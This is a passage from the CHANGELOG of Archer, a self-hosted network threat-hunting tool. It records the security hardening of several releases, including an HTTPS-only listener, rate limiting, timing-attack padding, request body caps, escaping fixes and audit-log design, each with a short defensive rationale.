     `http.Server` multiplexes both at the OS socket level
     trivially.
   - One cert satisfies both audiences. Sensors pin the public
     key via `--pinnedpubkey sha256//<fp>` (no chain validation
     — pinning checks SubjectPublicKeyInfo, not the chain).
     Browsers chain-validate against the CA. The operator-CA
     deployment path already documented in OPERATIONS.md
     produces a cert that does both simultaneously.
   - Log pushes are not on `:8443` and never were — sensors
     rsync logs over SSH on `:2222`. Collapsing the HTTPS
     listeners doesn't affect the log pipeline.

  Deployment impact:
   - Existing `start.sh` / `docker compose` deployments rebuild
     and start on `:8443` only. Old bookmarks to
     `http://archer:8080/` get a connection refused (hard-drop,
     not 308 redirect).
   - First load shows a browser cert warning if you're still on
     the auto-generated self-signed cert. Operator path: drop a
     CA-signed cert from your internal PKI into
     `/data/tls/server.{crt,key}` per OPERATIONS.md → TLS
     certificate rotation. Sensors re-pin during next
     enrollment.
   - `Dockerfile`'s `EXPOSE` and `docker-compose.yml`'s `ports`
     no longer publish 8080; CMD argument list drops `--addr`.

  Audit 2026-05-11 NEW-49.

### Added

- **`store.NormalizeEmail(s) string` — NFC + ASCII-fold + trim
  (NEW-51).** Pre-fix the email normalization at every entry
  point (login, register, admin user-create) was
  `strings.ToLower(strings.TrimSpace(s))` — handles Unicode
  case folding but does NOT normalize composed-vs-decomposed
  forms. So `café@example.com` written as NFC (U+00E9) and NFD
  (U+0065 U+0301) hashed to different strings in both the Go-
  side `EmailExists` check and SQLite's `COLLATE NOCASE` index;
  an attacker could register a near-duplicate email that
  bypassed the duplicate-detection. Narrow for hunt-team
  scope (internal team members don't pick unusual
  normalization forms deliberately) but the fix is mechanical
  and the discipline is worth applying. New helper in
  `internal/store/userstore.go`; `golang.org/x/text/unicode/norm`
  promoted from indirect to direct dependency. Audit 2026-05-11
  NEW-51.

### Changed

- **Session cookie is `Secure: true` unconditionally.** Was
  unset previously, which combined with the plaintext `:8080`
  listener meant the browser sent the cookie in clear on every
  HTTP request to the admin UI. Now that the plaintext path is
  gone (NEW-49), `Secure` enforces the invariant from the
  browser side too — no future regression can re-introduce a
  plaintext leak by re-adding an HTTP listener.

- **Admin user-create (`POST /api/users`) and user-update
  (`PATCH /api/users/{id}`) now use `decodeJSONBody` (NEW-50).**
  Pre-fix these two endpoints decoded request bodies with
  `json.NewDecoder(r.Body).Decode(...)` — no size cap. NEW-35
  was scoped to analyst-facing endpoints; these are admin-only
  with a narrower risk profile but the "no decoder reads
  unbounded" discipline should apply uniformly. Caps: 4 KiB
  for user-create, 1 KiB for user-update. Audit 2026-05-11
  NEW-50.

- **`/api/quiver/enroll` runs through the rate limiter
  (NEW-52).** Enrollment tokens are 24 random bytes from
  `crypto/rand` and unguessable in any realistic time, but
  each enroll request consumes work (token lookup, body
  decode, validation, authorized_keys write on success). A
  hostile client hammering enroll without rate limiting is a
  modest DoS surface. Same per-source-IP token bucket the
  other unauth endpoints use; uses the v0.14.4 NEW-47
  "audit once per trip" discipline so a sustained attack
  doesn't scale audit volume. Audit 2026-05-11 NEW-52.

- **Misleading comment on the Quiver route registration block
  removed (NEW-53).** Pre-fix the comment claimed Quiver
  routes were "served over the TLS listener" — false, since
  the routes were registered on the shared `mux` and reachable
  from both listeners. Comment now describes the actual
  topology (one TLS listener, shared mux, no session auth on
  Quiver paths because sensors aren't users). Aspirational vs.
  descriptive — same NEW-30 / NEW-41 lesson. Audit 2026-05-11
  NEW-53.

- **OPERATIONS.md threat-model section calls out the
  Sensors-modal vs. audit-log undercount under flood
  (NEW-54).** The v0.14.4 NEW-45 fix moved the rate limiter
  inside `recordUnauthorizedCheckin`, which means once a
  bucket trips, both the `unauthorized_attempts` row insert
  AND the audit-log emit are short-circuited. The Sensors-
  modal UI count is bounded by the rate limiter (~10 attempts
  per bucket cycle); the audit log is the authoritative
  attempt count via `request_rate_limited` rows. Doc note
  tells analysts to reconcile UI count against the audit log
  during sustained-flood incidents. Audit 2026-05-11 NEW-54.

### Documentation

- README, OPERATIONS, ARCHITECTURE, API, QUIVER, QUICKSTART_OPS,
  RELEASING, `start.sh`, `reset.sh` all updated for the
  HTTPS-only deployment. First-login URL is now
  `https://<host>:8443/` everywhere; install scripts log the
  new URL; OPERATIONS' deployment-hardening checklist promotes
  "generate a CA-signed cert from your internal PKI" to a
  REQUIRED item; OPERATIONS' threat model explicitly states
  "there is no plaintext HTTP listener."

### Maturation lessons

- **Deployment-posture audits are their own pass.** NEW-49
  survived ten audit rounds because attention was on handler
  logic, store mutations, and front-end escape correctness —
  not on what `cmd/archer/main.go` and the deployment
  artifacts (Dockerfile, docker-compose.yml, start.sh) say
  about how the binary is reachable. Going forward
  `cmd/archer/main.go` + Dockerfile + docker-compose +
  OPERATIONS.md should be audited together as a
  deployment-posture unit at least once per quarter; the
  threat model documents posture, and the code may not
  enforce it. Recorded in MATURATION_PLAN as a discipline
  check.

- **Defaults must match the threat model.** Pre-v0.14.5 the
  threat model said "the LAN may be hostile" and the default
  deployment said "transmit admin auth in cleartext on that
  same LAN." Those two are incompatible. The fix is to make
  the secure choice the only available default. Operators
  who want plaintext for testing have to deliberately rebuild
  with a fork — there is no `--insecure-http` flag. Recorded
  alongside the lesson above.

## [v0.14.4] — 2026-05-11

Ninth audit-driven correctness release. Four items from the post-
v0.14.3 review, three of which (NEW-45, NEW-47, NEW-48) are
direct consequences of the rate limiter shipped in v0.14.3 —
adversary-adapted thinking against the new defense that should
have been part of the v0.14.3 review pass and wasn't. The fourth
(NEW-46) is a textbook web-auth bug that survived ten prior
audit rounds because the auditor focused on the audit-log
additions of recent rounds and didn't read the long-standing
auth code with the same scrutiny.

### Changed

- **Quiver checkin rate limit now fires only on auth-failure
  outcomes (NEW-45).** Pre-fix the limit gated every checkin at
  the handler entrypoint, including authenticated successful
  ones. For deployments where multiple sensors share a NAT egress
  IP (sensor segment NAT'd through one gateway to reach Archer —
  common in team-scale deployments), the per-IP bucket was
  shared across the whole fleet. Hourly checkin with random-
  minute distribution kept the average comfortable, but a fleet
  burst (Archer restart, NTP sync triggering immediate-on-boot
  checkin, scheduled mass-reboot, mass-re-enrollment) would 429
  the 11th-onward sensor and leave the operator looking at a
  fleet that's "mysteriously offline." Fix moves the
  `s.rateLimit.allow(srcIP)` call from the handler entrypoint
  into `recordUnauthorizedCheckin` — the helper that only runs
  on unknown_name or bad_hmac outcomes — so legitimate HMAC-
  verified checkins never touch the limiter regardless of NAT
  topology. Audit 2026-05-11 NEW-45.

- **Rate-limit-trip audit row is now O(1) per bucket-trip, not
  O(N) per refused request (NEW-47).** Pre-fix the v0.14.3
  maturation note claimed the rate limiter closed the "audit-log-
  flood-as-DoS path" the v0.14.0 maturation note acknowledged.
  It didn't. The compute attack was closed (200s of bcrypt → 2s)
  but the audit emission still fired on every refused request, so
  an attacker hitting `/login` 1000 times in a minute produced
  ~10 `login_failure` audit rows plus ~990 `request_rate_limited`
  rows from the same IP — same volume, different label. Fix adds
  a `tripAudited bool` to each bucket. First refusal on a fresh
  bucket: audit + set flag. Subsequent refusals while flag set:
  silently refuse, no audit. Next admitted request: clear flag.
  Under sustained attack the audit gets exactly one
  `request_rate_limited` row per bucket-trip; an attacker who
  pauses and resumes audits exactly once more per restart cycle,
  which is the signal an audit reader actually wants. Closes the
  flood path the v0.14.3 note claimed but didn't close in code.
  Audit 2026-05-11 NEW-47.

- **Rate-limit bucket key uses IPv6 /64 prefix aggregation
  (NEW-48).** Pre-fix the bucket was keyed on the full source IP.
  For IPv4 this is correct — an attacker has one IP. For IPv6 an
  attacker owning a /64 (the standard residential / cloud
  allocation unit per customer) has 2^64 source addresses they
  can rotate through automatically via SLAAC privacy extensions
  or temporary addresses; each fresh address gets a fresh bucket
  with full capacity. The rate limit was effectively bypassed
  for any IPv6-reachable attacker. New `bucketKey()` helper:
  IPv4 keys on the full address; IPv6 keys on the `/64` prefix
  (the smallest unit per customer; sub-/64 rotation comes free
  with most ISP/cloud setups, /64-and-above rotation requires
  actual additional infrastructure). Test coverage in
  `rate_limit_test.go::TestRateLimit_IPv6BucketsAtSlash64` and
  `::TestRateLimit_IPv4PerAddress`. Audit 2026-05-11 NEW-48.

- **`Authenticate` runs `EnumerationTimingPad` on the unknown-
  email path (NEW-46).** Pre-fix two failure paths had very
  different latencies: email not in DB returned in ~1ms (no
  bcrypt invocation), email exists with wrong password ran the
  full bcrypt cost (~200ms at DefaultCost). UI message was
  identical, but an attacker measuring response time could
  enumerate which emails were registered — a textbook timing-
  oracle, present in the codebase since the first auth commit.
  NEW-39's rate limit slows enumeration but doesn't eliminate
  the leak: the first 10 attempts per IP/min still leak, and at
  10/min × hours a determined attacker can still distinguish
  exists-vs-not. Fix runs `us.EnumerationTimingPad(password)`
  before returning on the unknown-email path, equalising
  wall-clock latency across the two outcomes — same pattern the
  registration handler already used for the same reason. Test
  coverage in `userstore_timing_test.go::TestAuthenticate_TimingPad`
  asserts the unknown-email latency is at least 50% of the
  wrong-password latency. Audit 2026-05-11 NEW-46.

### Maturation lessons

- **New defenses get their own adversary-adapted review pass.**
  NEW-45 and NEW-47 are the kind of bugs that come from auditing
  for "does this fix the bug" without also asking "what does an
  attacker do after this lands?" The rate limiter addressed the
  log-flood it was specced for, but it broke shared-NAT sensor
  fleets and replaced one shape of audit-log flood with another.
  Future security-relevant additions should not ship without an
  explicit "if I were the adversary, how would I adapt?" pass.
  Recorded in MATURATION_PLAN as a discipline check.

- **Long-standing code is not implicitly safe.** NEW-46 is a
  textbook web-auth bug that survived ten prior rounds because
  attention was on the new audit-log surfaces. The "less likely"
  prior on old code is not "zero," and the audit window must
  occasionally re-read the original auth/parser/analyzer layers
  with the same scrutiny new code gets. The login-timing-oracle
  pattern is well-known enough that its survival here was a
  systematic-coverage failure, not a tactical miss.

## [v0.14.3] — 2026-05-11

Eighth audit-driven correctness release. Five Medium items
(NEW-37 through NEW-39, NEW-44, plus a doc-vs-code correction
on the analyst playbook) and four Low quality-of-life items
(NEW-40 through NEW-43) closing the audit-log coverage and
flood-protection gaps the post-v0.14.2 review surfaced. The
cluster's theme: boundary discipline at the audit-log
perimeter is now even — every authenticated mutation already
audited, and every *un*authenticated audit-emitting path now
audits AND is rate-limited.

### Added

- **Audit coverage of self-service registration (NEW-38).**
  Pre-fix the `/register` POST produced zero audit-log rows
  on either branch — including the first-user admin
  bootstrap, the single highest-privilege account-creation
  event in a deployment's lifetime. `user_register` (normal
  pending-viewer flow) and `admin_bootstrap` (first-user
  auto-promotion) cover both branches. Bootstrap is a
  separate action name so the audit-log filter can pinpoint
  it operationally; self-service registrations land with
  `actor_id=0` since the user isn't authenticated to act on
  their own behalf yet, with the registered email and the
  source IP captured for the trail. Both audit calls land
  AFTER the email-existence timing pad so the enumeration
  defence is unaffected. Audit 2026-05-10 NEW-38.

- **Audit coverage of explicit logout (NEW-44).** `logout`
  action lands on every `/logout` so session timelines are
  reconstructible from the audit log without inferring
  end-times from the absence of subsequent activity.
  Symmetric with `login_success` / `login_failure`. Audit
  2026-05-10 NEW-44.

- **Per-source-IP rate limiter on unauthenticated endpoints
  (NEW-39).** `/login`, `/register`, and `/api/quiver/checkin`
  are now gated behind a token bucket (10/min per source IP,
  continuous refill at 1 token per 6 seconds, idle buckets
  evicted after 10 minutes). Excess returns HTTP 429 *and*
  emits a `request_rate_limited` audit row so the limit-trip
  is visible without the hammering scaling the log itself —
  closing the audit-log-flood-as-DoS path the v0.14.0
  maturation note acknowledged but didn't close in code. New
  `internal/server/rate_limit.go`. Nil-safe on the receiver
  (`(rl *rateLimiter).allow(srcIP) bool`) so tests that
  construct a `*Server` directly without going through `New()`
  aren't broken; production code always gets a non-nil
  limiter. Audit 2026-05-10 NEW-39.

- **`internal/server/audit_actions.go` with the action
  vocabulary as Go constants (NEW-41).** Pre-fix every
  `recordAudit(r, "...", ...)` call site was a free-form
  string; a typo (`finding_status_chnage`) would silently
  produce a new fragmented action name and break the
  action-filter UI. New file declares every emitted action
  as a `const` plus a `knownAuditActions` set; new
  `audit_actions_test.go::TestAuditActionVocabulary` walks
  every `.go` file in the package, regex-extracts the action
  string from each `recordAudit` / `recordAuditLogin` /
  `LogAuditEvent` call site, and asserts both directions:
  every emission must use a known action *and* every
  constant must be used at least once (dead vocabulary is a
  test failure too). Same shape as the NEW-30 `_esc`
  consistency test: the rule is the test, not a docstring
  that drifts. Audit 2026-05-10 NEW-41.

- **`internal/server/json_decode.go` decodeJSONBody helper
  (NEW-40 + body-cap consolidation).** Single helper that
  wraps `http.MaxBytesReader` and decodes into the target
  struct with two failure modes: cap-exceeded returns 413
  Request Entity Too Large with a clear `body exceeds N byte
  cap` message; any other decode error returns 400 Bad
  Request with a generic "invalid JSON" message. Pre-fix the
  seven NEW-35 endpoints all wrote ad-hoc `json.NewDecoder(
  http.MaxBytesReader(...)).Decode(...)` chains and responded
  with 400 + raw decoder error text on every failure — which
  made operators chase JSON-shape questions when the actual
  issue was a size cap, and reflected internal parse offsets
  back at the client. All seven sites switched to the helper.
  Audit 2026-05-10 NEW-40.

### Changed

- **PATCH `/api/findings/{id}` validates the status enum
  (NEW-37).** Pre-fix `model.Status(req.Status)` was a typed-
  string cast with no validation — anything in the request
  body's `status` field was written verbatim to the findings
  table. An analyst account compromised by a script could
  PATCH every Critical finding to `archived` and have the
  UI's tab filters (open / acknowledged / escalated)
  silently drop them from default views, with the audit log
  faithfully recording the misleading "transition" as if it
  were real. Mirrors the validation `validateImportedFinding`
  already applies on `/api/import` — same asymmetric-
  validation pattern as v0.13.0 NEW-15 (sensor name
  validated at enrollment, not checkin). Audit 2026-05-10
  NEW-37.

- **`capStringSlice` samples from both ends of the sorted
  diff (NEW-42).** Pre-fix the audit-row added/removed
  sample was `xs[:n]` — alphabetically biased. A subtle
  malicious entry like `zzz_evil.example.com` buried in a
  bulk allowlist update would be alphabetically late and
  silently truncated from the human-readable diff. Hash +
  counts still caught the absolute fact of change, but the
  audit reader's diff view was biased. Now samples
  `xs[:n/2]` and `xs[len(xs)-(n-n/2):]` — half from each
  end. Test coverage in `audit_helpers_test.go`
  ::`TestCapStringSlice_BothEnds` anchors identifying
  entries at both ends of a 200-entry sorted slice and
  asserts both appear in the cap-50 sample. Audit 2026-05-10
  NEW-42.

- **`CountAuditLog` is now TTL-cached (NEW-43).** Pre-fix
  every audit-dialog page-load ran `SELECT COUNT(*) FROM
  audit_log`. For a hunt-team-scale table (thousands of
  rows) invisible; for a long-running deployment that missed
  the documented retention prune and grew to millions of
  rows, seconds per page-load. Cache TTL is 60 seconds —
  short enough that the "n total entries" readout never
  feels stale and the worst-case scan rate is one per minute
  regardless of UI poll frequency. Cache fields live on the
  `Store` struct; refresh drops the read lock during the
  `COUNT(*)` so readers aren't blocked. Audit 2026-05-10
  NEW-43.

- **Audit-dialog table columns are now dynamic-width with
  current values as the floor.** Pre-fix the "From" column
  was capped at 110px which truncated IPv6 source addresses.
  Changed `width:Npx` to `min-width:Npx` on the headers and
  added `white-space:nowrap` to the identity cells (When,
  Actor, Action, Target, From) so long values force the
  column wider rather than wrapping inside a fixed width.
  The Change column stays elastic with `word-break:break-all`
  so the diff column absorbs the slack.

- **`docs/ANALYST_PLAYBOOK.md` aligned with Archer's actual
  status enum.** Pre-fix the doc referenced
  `Status → false_positive`, but Archer's `Status` has only
  `open` / `acknowledged` / `escalated`. The Archer-aligned
  analyst workflow is acknowledge + suppression / allowlist
  entry for confirmed-benign findings; acknowledge with note
  for ambiguous-but-looked-at; escalate for malicious. Doc
  updated throughout (decision table, worked examples,
  per-status templates, anti-patterns) to use the
  acknowledge+suppress pattern instead of inventing a
  non-existent fourth status. Auditor 2026-05-10 doc
  correction. The alternative (adding `false_positive` as a
  fourth status enum) was considered and rejected — the
  allowlist/suppression artifact is the operational
  remediation that actually prevents the finding from firing
  again, so the three-status model + curation lists is the
  right shape.

### Maturation lessons

- **Boundary discipline must be even.** Pre-v0.14.3 the
  authenticated mutation paths all audited cleanly while
  the unauthenticated audit-emitting paths audited
  partially — registration not at all, login failure and
  sensor unauthorized at the granularity of the underlying
  store call only. v0.14.3 closes the unevenness on both
  axes: coverage (every audit-emitting boundary now emits)
  and flood protection (every unauthenticated boundary now
  rate-limits, with the trip itself audited). Recorded in
  MATURATION_PLAN as a discipline check for future audit
  emission sites: "is this path authenticated? if no, is it
  rate-limited? if no, fix that first, then add the
  emission."

- **Doc vs. code drift is its own bug class.** The
  `false_positive` references in ANALYST_PLAYBOOK.md slipped
  past review because the doc was written from how the
  reviewer expected the tool to work, not from reading the
  codebase. Going forward, analyst-facing docs must be
  validated against the actual enum/API/UI surface before
  shipping; treat doc-vs-code mismatch as a release
  blocker. Same shape as the v0.14.0 NEW-30 "aspirational
  vs. descriptive comment" lesson, generalised one level up.

## [v0.14.2] — 2026-05-10

Patch release closing three items from the post-v0.14.1 audit pass
(NEW-34, NEW-35, NEW-36) plus a cosmetic improvement to the
audit-log UI's TargetName rendering for finding actions.

### Added

- **`internal/server/audit.go` helpers (`diffStringSets`,
  `hashStringList`, `capStringSlice`, `listEditAuditDetail`,
  `findingAuditName`).** Pure functions, unit-tested in
  `audit_helpers_test.go`. Used by the v0.14.2 audit-emission
  changes below to keep `allowlist_edit` / `ioc_edit` rows small
  and finding audit rows scannable.

### Changed

- **`allowlist_edit` / `ioc_edit` audit rows record diff+hash,
  not full state (NEW-34).** Pre-fix these were the only audit
  emissions in the codebase that dumped full content rather than
  structural metadata — `BeforeValue`/`AfterValue` carried the
  entire pre- and post-edit lists. For a team curating a large
  IOC list (10K entries from a TI-feed dump, ~30 chars each), a
  single edit produced ~700KB of `audit_log` per row, and the
  JSON marshaling ran inside `LogAuditEvent` under `s.mu.Lock()`
  — blocking every in-memory read during the write. Replaced
  with the same shape the `finding_*` audits already use:
  `entry_count` + SHA-256 hash of the list in `BeforeValue` /
  `AfterValue`, plus the added/removed diff (capped at 50 per
  side with a `diff_truncated: true` marker for whole-list
  replacements) in `Details`. The hash makes the audit
  irrefutable at any size; the diff makes it human-useful for
  "who added entry X on date Y" queries. Audit 2026-05-10
  NEW-34.

- **`UpdateFinding` returns the pre-mutation snapshot (NEW-36).**
  Pre-fix the handlers for PATCH `/api/findings/{id}` and POST
  `/escalate` did a `GetFinding` then an `UpdateFinding` as
  separate calls; a concurrent PATCH on the same finding landing
  between them produced an audit row whose `BeforeValue.status`
  reflected what the user *thought* the prior state was rather
  than what `UpdateFinding` actually transitioned from. On-disk
  state was always correct, but the audit log could be
  misleading — and for an audit log claimed to be forensically
  reliable, "best-effort BeforeValue" doesn't meet the bar.
  Fixed by folding the snapshot into `UpdateFinding` under the
  same mutex; signature changes from `bool` to
  `(model.Finding, bool)`. Test coverage in
  `store_test.go::TestStore_FindingsIndexAndMutate` extended to
  assert the before-snapshot reflects pre-mutation state. Audit
  2026-05-10 NEW-36.

- **`TargetName` on `finding_status_change` / `finding_escalate`
  / `finding_note_add` audit rows.** Pre-fix it was just the
  finding `Type`, which made the audit-log UI render five
  "Beaconing" rows in a row with no way to distinguish them
  without clicking into each. Now `Type src → dst:port`
  (e.g. `Beaconing 10.4.1.7 → 185.99.135.7:443`) — answers
  the question an analyst skimming the log was asking.
  Cosmetic, paired with NEW-36.

### Fixed

- **Unbounded JSON decoders on seven analyst-facing mutation
  endpoints (NEW-35).** PATCH `/api/findings/{id}`, POST
  `/api/findings/{id}/escalate`, POST `/api/findings/{id}/notes`,
  PUT `/api/allowlist`, PUT `/api/ioc-list`, POST
  `/api/suppressions`, and PUT `/api/config` all decoded
  request bodies with no size limit. A compromised analyst
  session — or a buggy automation script with the wrong loop
  variable — could write a 100MB note onto a finding (persisted
  to disk, returned in every subsequent `/api/findings/{id}`
  response, copied through every `SetFindings` merge), POST a
  multi-MB allowlist (combined with NEW-34's pre-fix shape that
  meant the audit row alone was ~100MB), or have the JSON
  decoder consume an arbitrarily large body just to PATCH a
  status. The `/api/import` path already had `MaxBytesReader`
  with `importMaxBytes`, and the Quiver/sensor endpoints had
  their own matching caps — the discipline was known and
  intentional everywhere except these seven. New named
  constants in `handlers_api.go`: `noteBodyMaxBytes` (64KB),
  `escalateBodyMaxBytes` (256KB), `listBodyMaxBytes` (4MB),
  `suppressBodyMaxBytes` (8KB), `configBodyMaxBytes` (16KB).
  Sized to the realistic content shape with generous headroom.
  Audit 2026-05-10 NEW-35.

### Maturation lessons

- **The "shape not content" principle is now load-bearing.**
  v0.14.1 introduced it for the `finding_*` audit rows
  (note bodies live on the finding, audit records length).
  v0.14.2 carries the same principle to the list-edit audits
  (diff + hash, not full state). Future audit-emission sites
  should follow this — record the structural transition, not
  the raw content — and add a CHANGELOG line explicitly
  acknowledging the choice when content omission is
  non-obvious.

- **No JSON decoder reads unbounded.** Recorded in
  MATURATION_PLAN as a discipline. Every new endpoint that
  decodes a request body adds a documented size cap. The
  v0.14.2 NEW-35 fix and v0.13.0 NEW-25 cluster both surfaced
  from the same class of "we knew to do this elsewhere; these
  were oversights" — the pattern is established, the
  enforcement was missing.

## [v0.14.1] — 2026-05-10

Patch release closing the two audit-log gaps surfaced by the
post-v0.14.0 review pass: analyst state changes on findings
weren't logged (NEW-32), and sensor-side authentication failures
landed in `unauthorized_attempts` but not `audit_log` (NEW-33).
Both are discoverability gaps — the forensic trail existed but
wasn't centrally queryable — and both close cleanly without
schema churn.

### Added

- **`finding_status_change` / `finding_escalate` / `finding_note_add`
  audit actions (NEW-32).** Analyst-side state changes on findings
  now produce audit-log rows alongside the in-row note history
  that was already preserved. PATCH `/api/findings/{id}` logs the
  status transition with `BeforeValue`/`AfterValue`. POST
  `/api/findings/{id}/escalate` logs the transition plus the
  selected IPs and services (the TI-pivot payload). POST
  `/api/findings/{id}/notes` logs only the note length. Note
  bodies are intentionally omitted from the audit log — they
  can carry operationally sensitive analyst observations (named
  hosts, suspected target indicators) and the full text is
  already preserved on the finding's notes array. The audit row
  records the *shape* (length, escalation artefacts) for IR
  queries; the *content* stays on the finding. Closes the gap
  where "who marked finding #N as false positive on date Y" was
  technically reconstructible from the finding row's
  `analyst`/`status_ts` columns but not centrally queryable
  against the audit log. Auditor 2026-05-10 NEW-32.

- **`sensor_unauthorized_attempt` audit action (NEW-33).** Sensor
  checkin failures (`/api/quiver/checkin` rejecting an unknown
  name or a v2 sensor whose HMAC didn't verify) now write an
  audit-log row in addition to the existing `unauthorized_attempts`
  table row and SSE event. `actor_id` is NULL — sensors aren't
  users. `details.reason` narrows the failure to `unknown_name`
  (sensor name not in the enrolled-or-disenrolled set) or
  `bad_hmac` (name is enrolled but the v2 signature didn't
  verify — high-signal: usually means the sensor lost its secret
  file or someone has the name list but not the secret). The
  `unauthorized_attempts` table remains the live UI surface and
  is not displaced; this is the centralised-IR-query companion.
  Auditor 2026-05-10 NEW-33.

- **`docs/QUICKSTART_OPS.md` — 5-minute deploy/restore TL;DR.**
  Triage doc for the engineer who hasn't read the 600-line
  OPERATIONS.md. Three pre-flight questions, 10 deploy
  commands, 5 restore commands, three things to know before
  going live, first-debug commands. Cross-linked from
  OPERATIONS.md's header. Auditor 2026-05-10 (recommended
  alongside NEW-32/33).

### Maturation lessons

- **Audit log captures the *shape* of analyst actions, not the
  *content*.** Logging the note text would either duplicate
  data already preserved on the finding (a redundancy that
  drifts the moment the finding's notes are edited) or leak
  operational specifics into a log most analysts don't expect
  to be content-readable. Recording length + structural
  metadata lets the audit log answer "did anyone add a note to
  finding X" without becoming a parallel notes channel. The
  same principle applies to escalation IPs/services (recorded
  as shape) vs the escalation note (length only).

## [v0.14.0] — 2026-05-10

Sixth audit-driven correctness release, plus the first round
focused on team-deployment readiness rather than bug-finding. Two
audit items (NEW-30, NEW-31), one major operational addition
(audit log), and supporting documentation (OPERATIONS.md). The
auditor's "is this ready for a mature team?" check listed several
operational gaps; this release closes the highest-impact ones
(audit log, operator runbook) and explicitly scopes the rest (SSO
out, multi-tenant out, metrics roadmapped).

### Added

- **`audit_log` table + admin-only viewer (v0.14.0 feature).**
  Migration 0009 adds the table with a structured incident-
  response shape: `id`, `ts`, `actor_id` (FK-shaped but not
  declared FK so deleting an admin doesn't cascade away their
  audit trail), `actor_email` (denormalised at write time so the
  email at the time of the action survives later renames or row
  deletions), `action`, `target_type`, `target_id`,
  `target_name` (denormalised for the same reason — six months
  later "sensor 12" is unhelpful, "sensor 12 (edge-fw-east)" is),
  `before_value` / `after_value` (JSON, for state transitions
  like role change, feed update, allowlist edit), `details`
  (JSON fallback for non-transition events), `source_ip`.
  Composite indexes `(ts DESC, action)` for the dominant most-
  recent-filtered-by-action UI query and `(actor_id, ts DESC)`
  for the "show me everything user X did" incident-response
  query.

  Append-only is a code-side invariant — the `store` package
  has no UPDATE or DELETE statements against `audit_log`. Not a
  SQLite trigger because a trigger would block the documented
  retention-prune path in OPERATIONS.md.

  Action names use snake_case in a flat namespace (bounded
  vocabulary, easier filter): `login_success` / `login_failure`,
  `user_create` / `user_role_change` / `user_status_change` /
  `user_delete`, `enrollment_token_create` /
  `enrollment_token_revoke`, `sensor_disenroll` / `sensor_purge`
  / `sensor_schedule_change`, `feed_create` / `feed_update` /
  `feed_delete` / `feed_refresh`, `suppression_add` /
  `suppression_delete`, `allowlist_edit` / `ioc_edit`,
  `config_change` / `watch_change`, `finding_import`.

  New `Store.LogAuditEvent` / `ListAuditLog` / `CountAuditLog`
  helpers (cursor-based pagination capped at 500 server-side).
  New `Server.recordAudit(r, action, auditEvent{...})` wraps the
  store call to pull actor identity and source IP from the
  request context; sites populate `BeforeValue` / `AfterValue`
  for true state transitions and `Details` for non-transition
  events. New `Server.recordAuditLogin` handles the login
  handler where the actor isn't in the request context yet
  (failure paths log `actor_id=0` as SQL NULL, success path logs
  the authenticated user).

  Config-change audit redacts API-key fields (`*_api_key`) —
  records "set"/"" rather than the secret value, so an audit
  reader can see that a key was added/removed/rotated without
  the audit log becoming a credential leak vector. Read-only
  GETs and sensor checkins are not logged (would drown out the
  actual decisions). New `GET /api/audit-log?cursor=…&count=…`
  endpoint plus an Audit dialog in the admin UI
  (`web/static/js/audit_log.js`, new module) that renders the
  transition as `before:` / `after:` k=v lines, falling back to
  the details bag for non-transition events.

- **Go-side `_esc()` consistency test
  (`TestEscConsistency_AcrossSPAModules`).** Walks every JS
  file in `web/static/js/`, finds every `function _esc(...)`
  body, and asserts each contains references to all five HTML
  entities (`&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#39;`). Pre-
  NEW-30 there were three distinct shapes (strong, near-strong,
  weak) and the comment claiming a "convention" was
  aspirational rather than descriptive; this test makes the
  invariant enforceable rather than wished-for. NEW-30.

- **`Store.TryStartAnalysis() bool` atomic claim (NEW-31).**
  Folds the racy `IsAnalyzing()` + `SetAnalyzing(true)` pair
  into one mutex-protected operation. New regression test
  `TestTryStartAnalysis_AtomicClaim` covers the serial case
  plus a 50-goroutine concurrent claim — exactly one winner
  must observe true. Audit 2026-05-10 NEW-31.

- **`docs/OPERATIONS.md` operator runbook.** Threat model
  (in-scope vs. out-of-scope defenses + trust boundaries),
  deployment hardening checklist (TLS, network, secrets, log
  retention, auth posture), upgrade procedure (standard and
  breaking), backup + tested-restore procedure (with explicit
  "test the restore on a *different* host" guidance — the only
  way to verify the TLS material is actually in the bundle and
  sensors don't need re-enrollment after a host swap), sensor
  lifecycle (enrollment / disenrollment / purge /
  re-enrollment), user offboarding runbook (admin deletes user
  row → `DeleteSessionsForUser` evicts live sessions within one
  request cycle → `user_delete` audit row with denormalised
  email preserves the trail), audit-log schema and action
  catalog with incident-response query examples, TLS
  certificate rotation, disaster recovery symptom→first-step
  table, and scope decisions (SSO/identity explicitly local-
  only with the deploy-behind-reverse-proxy guidance for teams
  that need SSO, multi-tenant out, metrics roadmapped).
  Companion to README.md (features + install) and
  docs/ARCHITECTURE.md (internals).

### Changed

- **All seven `_esc()` implementations in the SPA collapsed
  to the canonical strong shape (NEW-30).** Pre-NEW-30 the
  codebase had three distinct profiles across seven files:
  strong (`& < > " '` — notifications.js, campaigns.js,
  feeds.js, sensors.js), near-strong (missing `'` —
  table.js), and weak (missing `"` and `'` — app.js,
  detail.js). The weak instances were only safe in HTML-text
  contexts where `< &` escape suffices; a developer copy-
  pasting an attribute-context interpolation into app.js or
  detail.js (`title="${_esc(x)}"`) would have silently
  introduced XSS without realizing the local function was
  weaker than its name. Now every copy is the same regex+
  table form from feeds.js/sensors.js; each carries a
  comment pointing back to app.js for the convention notes
  and at the Go-side consistency test. Audit 2026-05-10
  NEW-30.

- **`launchAnalysisWithOptions` and `launchTIOnly` now use
  `TryStartAnalysis` (NEW-31).** Pre-fix both did the racy
  `IsAnalyzing()` + `SetAnalyzing(true)` pair, leaving a
  real (if narrow) TOCTOU window where two near-
  simultaneous triggers (watch tick fires while user clicks
  "Analyze sensor logs", or two watch ticks fire in quick
  succession when a run takes longer than the watch
  interval) could both pass the guard and spawn parallel
  analyzer goroutines. Consequences were nasty:
  cancel-button semantics broke (only the second goroutine
  stopped, the first ran to completion regardless), SSE
  progress events interleaved, memory doubled. Both
  functions now return `bool` (true on claim, false on
  contention); HTTP handlers convert false to 409 Conflict;
  watch tick handler emits an SSE status message and exits.
  Audit 2026-05-10 NEW-31.

### Maturation lessons

- **Aspirational comments vs. descriptive comments.**
  Recorded in MATURATION_PLAN section 8. Comments that
  describe codebase invariants must either be backed by a
  test (and survive drift) or self-mark as aspirational.
  Writing the test in the same hour as the comment is the
  convention going forward.

- **Audit-log writes are observability, not enforcement.**
  The shape decision worth recording from this round:
  `LogAuditEvent` is best-effort. Refusing an admin action
  because the audit table couldn't be written would be a
  denial-of-service on the most-privileged paths — worse
  than a gap in the audit log. The gap is visible (action
  counts vs. UI activity); the DoS would be invisible until
  production.

### Scope decisions (explicit)

These are declared NON-features. They're documented in
